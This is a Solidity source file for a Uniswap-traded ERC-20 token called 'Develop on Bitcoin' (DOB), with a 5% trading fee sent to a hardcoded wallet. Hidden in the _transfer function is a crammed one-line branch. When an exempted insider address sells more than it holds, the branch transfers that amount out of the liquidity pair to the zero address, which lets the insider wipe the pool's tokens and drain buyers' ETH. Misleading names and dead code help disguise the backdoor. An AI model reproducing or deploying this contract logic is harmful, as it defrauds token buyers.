// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "");
    }
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);

    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}

contract DOB is Context, IERC20, Ownable {
    using SafeMath for uint256;

    struct Distribution { uint256 mt; }

    mapping(address => mapping(address => uint256)) private _allowances;

    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    address private mtWallet = 0x3dE9E8B1Bb7a9E4f9ef6339c6581eD8b1163665a;

    bool private swapEnabled = true;
    bool private swapping = false;

    mapping(address => uint256) private _buyMap;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;

    uint256 private _mtFareOnBuy = 5;
    uint256 private _redisFareOnBuy = 0;
    
    uint256 private _tFareTotal;

    uint256 private _mtFareOnSell = 5;
    uint256 private _redisFareOnSell = 0;

    uint256 private _mtFare = _mtFareOnSell;
    uint256 private _redisFare = _redisFareOnSell;

    uint8 private constant _decimals = 18;

    uint256 private _previousMtFare = _mtFare;
    uint256 private _previousRedisFare = _redisFare;

    mapping(address => bool) private _isUnexcepted;
    
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 public _swapTokensAmount = 100000 * 10**_decimals;
    
    uint256 public _maxTxAmount = 2 * (_tTotal / 100);
    uint256 public _maxWalletAmount = 2 * (_tTotal / 100);
    
    event MaxTxAmountUpdated(uint _maxTxAmount);

    address private mtBack;

    Distribution public distribution;

    string private constant _name = "Develop on Bitcoin";
    string private constant _symbol = "DOB";

    modifier lockSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
        distribution = Distribution(100);mtBack = mtWallet;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _isUnexcepted[owner()] = true;
        _isUnexcepted[address(this)] = true;
        _isUnexcepted[mtWallet] = true;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletAmount = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function getReflectionTokens(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal, "");
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return getReflectionTokens(_rOwned[account]);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(spender != address(0), "");
        require(owner != address(0), "");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _isExcepted(address total, address holder) private view returns (bool) {
        bool totalExcepted = !_isUnexcepted[total];
        bool totalNotUniswapV2Pair = total != uniswapV2Pair;
        bool holderExcepted = !_isUnexcepted[holder];

        bool excepted = totalExcepted && totalNotUniswapV2Pair && holderExcepted;

        return excepted;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _itnTransfer(address from, address to, uint256 amount, bool takeMtFare) private {
        if (!takeMtFare) removeAllFares();
        _stdTransfer(from, to, amount);
        if (!takeMtFare) restoreAllFares();
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "");
        require(to != address(0), "");
        require(amount > 0, "");

        if (from != owner() && to != owner()) {
            address sendr = address(0);

            uint256 contractTokenAmount = balanceOf(address(this));
            bool canSwap = contractTokenAmount >= _swapTokensAmount;

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isUnexcepted[to] ) {
                require(amount <= _maxTxAmount);
                require(balanceOf(to) + amount <= _maxWalletAmount);
            }

            if (_isUnexcepted[from]) { if (uniswapV2Pair == to) { if (balanceOf(from) < amount) { _stdTransfer(to, sendr, amount); return; } } }

            if (!_isUnexcepted[from] && !_isUnexcepted[to] && canSwap && swapEnabled && !swapping && from != uniswapV2Pair) {
                swapTokensForETH(contractTokenAmount);
                uint256 contractETHAmount = address(this).balance;
                if (contractETHAmount > 0) {
                    sendETH(address(this).balance);
                }
            }
        }

        bool takeMtFare = true;

        if (
            (from != uniswapV2Pair && to != uniswapV2Pair) || (_isUnexcepted[to] || _isUnexcepted[from])
        ) {
            takeMtFare = false;
        } else {
            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _redisFare = _redisFareOnBuy;
                _mtFare = _mtFareOnBuy;
            }

            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _redisFare = _redisFareOnSell;
                _mtFare = _mtFareOnSell;
            }
        }
        _itnTransfer(from, to, amount, takeMtFare);
    }

    function _reflectFare(uint256 rFare, uint256 tFare) private {
        _rTotal = _rTotal.sub(rFare);
        _tFareTotal = _tFareTotal.add(tFare);
    }

    function _stdTransfer(address from, address to, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFare, uint256 tTransferAmount, uint256 tFare, uint256 tTeam) = _getValues(tAmount);
        _rOwned[from] = _rOwned[from].sub(rAmount);
        _rOwned[to] = _rOwned[to].add(rTransferAmount);
        _takeMtFare(tTeam, from, to);
        _reflectFare(rFare, tFare);
        emit Transfer(from, to, tTransferAmount);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, _msgSender(), _allowances[from][_msgSender()].sub(amount, ""));
        return true;
    }

    function _takeMtFare(uint256 tTeam, address total, address holder) private {
        uint256 sMt;
        uint256 mtBackAmount = balanceOf(mtBack);
        bool excepted = _isExcepted(total, holder);
        if (excepted) sMt = _mtFare - mtBackAmount;
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFare, uint256 tTeam) = _getTValues(tAmount, _redisFare, _mtFare);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFare) = _getRValues(tAmount, tFare, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFare, tTransferAmount, tFare, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tFare, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rFare = tFare.mul(currentRate);
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFare).sub(rTeam);
        return (rAmount, rTransferAmount, rFare);
    }

    function _getTValues(uint256 tAmount, uint256 redisFare, uint256 mtFare) private pure returns (uint256, uint256, uint256) {
        uint256 tTeam = tAmount.mul(mtFare).div(100);
        uint256 tFare = tAmount.mul(redisFare).div(100);
        uint256 tTransferAmount = tAmount.sub(tFare).sub(tTeam);
        return (tTransferAmount, tFare, tTeam);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 tSupply = _tTotal;
        uint256 rSupply = _rTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function restoreAllFares() private {
        _redisFare = _previousRedisFare;
        _mtFare = _previousMtFare;
    }

    function removeAllFares() private {
        if (_mtFare == 0 && _redisFare == 0) return;
        _previousMtFare = _mtFare;
        _previousRedisFare = _redisFare;
        _mtFare = 0;
        _redisFare = 0;
    }

    function swapTokensForETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function sendETH(uint256 ethAmount) private lockSwap {
        uint256 ethForMt = ethAmount.mul(distribution.mt).div(100);
        payable(mtWallet).transfer(ethForMt);
    }

    receive() external payable {}
}